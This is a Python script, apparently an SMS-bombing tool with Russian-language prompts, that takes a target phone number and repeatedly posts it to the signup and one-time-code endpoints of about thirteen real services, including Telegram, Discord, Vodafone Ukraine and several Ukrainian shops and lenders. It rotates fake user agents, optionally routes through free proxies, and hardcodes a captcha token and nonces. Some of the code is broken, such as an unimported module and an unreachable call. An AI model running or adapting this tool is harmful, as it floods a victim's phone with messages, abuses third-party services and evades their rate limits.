#------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
import requests,fake_useragent,time,os,threading
from threading import Thread
from rich.console import Console
from rich.progress import *
#------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
console = Console()

os.system('cls' if os.name == 'nt' else 'clear')
#------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
def generate_info():
    global _name
    global _email
    global password
    global username
    global junker_phone
    _name = ''
    password = ''
    username = ''
    for x in range(12):
        _name = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
        password = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
        username = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
    _email = _name + '@gmail.com'
    email = _email
#------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
def generate_proxy():
    proxy = requests.get("https://gimmeproxy.com/api/getProxy?curl=true&protocol=http&supportsHttps=true").text
    console.print(proxy)
    return {"http": proxy, "https": proxy}
    main()
#------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
console.print('''[bold red]
 Создатель - Hironotori
 Telegram - @Hironotori
 Человек которий сильно помог - @GGClubbb
''')
#------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
number = input('Beeante HOMeP tenedona: (бes + ')
#------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
proxy = console.input('[yellow]Использовать прокси? (y/n):\n[blue]spammer>> ')
if proxy.lower() == "y":
        proxies = generate_proxy()
else:
        proxies = None
#------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
run = int(console.input('[green]Введите количество повторов (1-10):\n[blue]spammer>> '))
#------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
for _ in track(range(run)):
 headers = {"User-Agent": fake_useragent.UserAgent().random}
 try:
         requests.post("https://prosto.tv/wp-admin/admin-ajax.php", data={"action": "resend-sms", "phone": number, "_nonce": "f756e84935", "g_token": "03AGdBq26EobJUiHnokFKND-S2I7C46jdehz_ek1kV-4E1nMs6dHBG8xQDsNqtSwyVvbKqQDzMr9d9jx9KekrJL_F6v1afaqSmte-el3RB3zE_LL-iYrbae8wYygpwicPeFoZy8qPJmOJW2o3U4KgP74MGrXv3PFY-3rBZK4L3ieSvEAcGI8MA8L6PmmINgZ1jzX4Kd8_G6QNPREbg2uP88xEYju31VqVbY1B4rGjSee3IaOsRIwzXxLXm7yX3fluYRg-ynA14ke_lkwxeA-mnUCi_oKoNYoumqrq6sk64v50dqm98iZfSjAy-HhWVxpGSEadAgg860dbItvlYNxpoPxCTSjN9kmsmdEpJc8J3Exd27botpJBs_dEEtKmQh7Rorz-sSerIAxbss66cl5N7H-Ih_TUMEIKJGWLAXBYDrOMUa7IBu6HtnKQgG0LwDQqGDiwDMOw7mKrl"}, headers=headers, proxies=proxies)
         print('prosto.tv')
 except:
         print('Не отправлено (prosto.tv)')
 try:#ok
         requests.post("https://my.xtra.tv/api/signup?lang=uk", data={"phone": number}, headers=headers, proxies=proxies)
         print('my.xtra.tv')
 except:
         print('Не отправлено (my.xtra.tv)')
 try:#ok
         requests.post("https://bi.ua/api/v1/accounts", json={"grand_type": "sms_code", "login": "Сергей", "phone": number, "stage": "1"}, headers=headers, proxies=proxies)
         print('bi.ua')
 except:
         print('Не отправлено (bi.ua)')
 try:#ok
         requests.post("https://my.ctrs.com.ua/api/auth/login", data={"provider": "phone", "identity": number}, headers=headers, proxies=proxies)
         print('ctrs')
 except:
         print('Не отправлено (ctrs)')
 try:#ok
         requests.post("https://my.telegram.org/auth/send_password", data={"phone": "+" + number}, headers=headers, proxies=proxies)
         print('telegram')
 except:
         print('Не отправлено (telegram)')
 try:#ok/no
         requests.post("https://discord.com/api/v9/auth/register/phone", json={"phone": "+" + number}, headers=headers, proxies=proxies)
         print('discord')
 except:
         print('Не отправлено (discord)')
 try:#ok
         requests.post("https://registration.vodafone.ua/api/v1/process/smsCode", json={"number": number}, headers=headers, proxies=proxies)
         print('vodafone')
 except:
         print('Не отправлено (vodafone)')
 try:#ok
         requests.post("https://megasport.ua/api/auth/phone/?language=ru", json={"phone": "+" + number}, headers=headers, proxies=proxies)
         print('megasport')
 except:
         print('Не отправлено (megasport)')
 try:#ok
         requests.post("https://zolotakoroleva.ua/api/send-otp", json={"params": {"phone": "+" + number}}, headers=headers, proxies=proxies)
         print('zolotakoroleva.ua')
 except:
         print('Не отправлено (zolotakoroleva.ua)')
 try:#ok
         requests.post("https://mozayka.com.ua/!processing/ajax.php", data={"phone": "+" + number, "mp_m": "sendsmscodereg", "token": "9d064a2beeb932ae5de11f74631269b4"}, headers=headers, proxies=proxies)
         print('mozayka.com.ua')
 except:
         print('Не отправлено (mozayka.com.ua)')
 try:#ok
         requests.post("https://kazan-divan.eatery.club/site/v1/pre-login", json={"phone": number}, headers=headers, proxies=proxies)
         print('kazan-divan.eatery.club')
 except:
         print('Не доставлено (kazan-divan.eatery.club)')
 try:#ok
         requests.post("https://admin1.groshivsim.com/api/sms/phone-verification/create", json={"phone": number}, headers=headers, proxies=proxies)
         print('groshivsim.com')
 except:
         print('Не отправлено (groshivsim.com)')
 try:#ok
         requests.post("https://money4you.ua/api/clientRegistration/sendValidationSms", json={"fathersName": "Витальевич", "firstName": "Виталий", "lastName": "Соколов", "phone": "+" + number, "udriveEmployee": "false"}, headers=headers, proxies=proxies)
         print('money4you.ua')
 except:
         print('Не отправлено (money4you.ua)')
#------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
